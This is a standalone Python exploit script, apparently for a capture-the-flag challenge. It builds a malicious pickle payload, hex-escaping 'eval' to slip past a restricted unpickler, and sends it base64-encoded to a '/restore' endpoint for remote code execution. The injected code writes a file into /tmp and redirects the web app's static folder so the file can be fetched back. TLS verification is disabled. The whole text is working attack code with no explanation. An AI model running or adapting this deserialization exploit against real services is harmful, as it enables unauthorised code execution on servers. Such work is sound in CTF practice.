import base64
import urllib.request
import json
import ssl

def run_expr(expr):
    eval_str = "".join(f"\\x{b:02x}" for b in b"eval")
    code_str = "".join(f"\\x{b:02x}" for b in expr.encode())

    p = bytearray()
    p.extend(b"(")
    p.extend(b"isessionstore\nCapsule\n")
    p.extend(b"(")
    p.extend(b"S'cache'\n")
    p.extend(b"csessionstore\n__builtins__\n")
    p.extend(b"d")
    p.extend(b"b")
    p.extend(b"p0\n")
    p.extend(b"0")
    p.extend(b"(")
    p.extend(b"(")
    p.extend(b"g0\n")
    p.extend(f"S'{eval_str}'\n".encode())
    p.extend(b"isessionstore\nrender\n")
    p.extend(f"S'{code_str}'\n".encode())
    p.extend(b"o")

    b64 = base64.b64encode(p).decode()
    url = "https://0c6523a28168f7fd.chal.ctf.ae/restore"
    req = urllib.request.Request(
        url,
        data=json.dumps({"payload": b64}).encode(),
        headers={"Content-Type": "application/json"}
    )
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    with urllib.request.urlopen(req, context=ctx) as r:
        return r.read().decode()

expr = """exec(\"\"\"
import webapp
with open('/tmp/test.html', 'w') as f:
    f.write('<h1>HELLO_STATIC_TMP</h1>')
webapp.app.static_folder = '/tmp'
print('STATIC_FOLDER_SET_TO_TMP')
\"\"\")"""

for _ in range(6):
    run_expr(expr)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

with urllib.request.urlopen("https://0c6523a28168f7fd.chal.ctf.ae/static/test.html", context=ctx) as r:
    print("Static test:", r.read().decode())
